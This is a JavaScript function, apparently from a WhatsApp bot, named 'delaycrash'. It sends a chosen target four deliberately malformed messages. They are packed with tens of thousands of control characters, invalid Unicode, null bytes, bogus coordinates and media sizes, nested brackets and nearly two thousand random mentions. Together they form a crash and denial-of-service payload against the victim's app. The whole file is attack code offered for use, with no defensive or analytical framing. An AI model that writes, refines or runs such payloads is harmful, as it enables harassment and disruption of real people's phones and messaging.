async function delaycrash(sock, target, mention = false) {
  try {
    const msgContent1 = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "" + "\u202E".repeat(500) + "\uDBFF\uDFFF".repeat(1000),
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: "\u900A" + "\u0000".repeat(5000) + "\uFFFF".repeat(2000),
                    address: "\u0007".repeat(20000) + "꧔꧈".repeat(5000) + "\u2060".repeat(1000),
                  },
                },
                body: {
                  text: "" + "\u0003".repeat(10000) + "꧔꧈".repeat(2000)
                },
                contextInfo: {
                  remoteJid: target,
                  participant: "0@s.whatsapp.net",
                  stanzaId: "1234567890ABCDEF",
                  forwardingScore: 99999,
                  isForwarded: true,
                  businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                  },
                  mentionedJid: [
                    target,
                    "1@s.whatsapp.net",
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1997 }, () =>
                      `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                    )
                  ]
                }
              }
            }
          }
        }
      }
    };
    
    const pack1 = generateWAMessageFromContent(target, msgContent1, { userJid: target });
    await sock.relayMessage(target, pack1.message, { messageId: pack1.key.id });
    
    const msgContent2 = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const pack2 = generateWAMessageFromContent(target, { message: msgContent2 }, { userJid: target });
    await sock.relayMessage(target, pack2.message, { messageId: pack2.key.id });
    
    const msgContent3 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 992.999999,
                degreesLongitude: -932.8889989,
                name: "\u900A",
                address: "\u0007".repeat(20000)
              }
            },
            body: {
              text: ""
            },
            interactiveResponseMessage: {
              body: { text: "", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                status: true,
                messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
                paramsJson: JSON.stringify({
                  "screen_0_TextInput_0": "radio - buttons" + "ꦾ".repeat(70000),
                  "screen_0_Dropdown_2": "001-Grimgar",
                  "screen_0_RadioButtonsGroup_3": "0_true",
                  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
              }
            }
          }
        }
      }
    };

    const pack3 = generateWAMessageFromContent(target, msgContent3, { userJid: target });
    await sock.relayMessage(target, pack3.message, { messageId: pack3.key.id });    
    
    const msgContent4 = {
      extendedTextMessage: {
        text: "᬴".repeat(250000),
        contextInfo: {
          mentionedJid: Array.from({ length: 1950 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          )
        }
      },
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
        mimeType: "audio/mpeg",
        sha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
        encSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
        mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
        directPath: "/v/t62.7114-24/30578226.enc",
        fileLength: 99999999999999,
        mediaKeyTimestamp: 99999999999999,
        seconds: 99999999999999,
        fileEncSha256: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
      }
    };

    const pack4 = generateWAMessageFromContent(target, { message: msgContent4 }, { userJid: target });
    await sock.relayMessage(target, pack4.message, { messageId: pack4.key.id });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: pack2.key, type: 25 } }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "( # )" },
          content: undefined
        }]
      });
    }

    console.log("delaycrash success", target);

  } catch (err) {
    console.error("Error in delaycrash:", err);
  }
}